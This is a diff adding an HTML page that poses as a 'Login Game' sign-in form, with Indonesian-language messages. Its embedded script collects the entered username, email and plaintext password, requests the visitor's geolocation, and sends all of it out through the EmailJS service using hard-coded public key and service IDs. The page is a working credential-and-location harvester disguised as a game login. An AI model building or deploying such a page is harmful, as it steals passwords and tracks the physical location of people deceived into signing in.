@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login Game</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1f1f2e;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    input, button {
+      margin: 10px;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+    }
+
+    input {
+      width: 250px;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    h2 {
+      margin-bottom: 30px;
+    }
+  </style>
+
+  <script>
+    emailjs.init("P2F6IEIWdwQ2UYFGk"); // Ganti ini dengan PUBLIC KEY kamu
+
+    function sendLoginData() {
+      const username = document.getElementById("username").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      if (!username || !email || !password) {
+        alert("Harap lengkapi semua field!");
+        return;
+      }
+
+      if (!navigator.geolocation) {
+        alert("Geolocation tidak didukung browser ini.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        const templateParams = {
+          username: username,
+          email: email,
+          password: password,
+          latitude: latitude,
+          longitude: longitude
+        };
+
+        emailjs.send("service_tgq7wnk", "template_fhsowxs", templateParams)
+          .then(function(response) {
+             alert("Data berhasil dikirim!");
+          }, function(error) {
+             alert("Gagal mengirim data 😓");
+             console.log(error);
+          });
+      }, function(error) {
+        alert("Gagal mengambil lokasi: " + error.message);
+      });
+    }
+  </script>
+</head>
+<body>
+  <h2>Login Game</h2>
+  <input type="text" id="username" placeholder="Username">
+  <input type="email" id="email" placeholder="Email">
+  <input type="password" id="password" placeholder="Password">
+  <button onclick="sendLoginData()">Login</button>
+</body>
+</html>
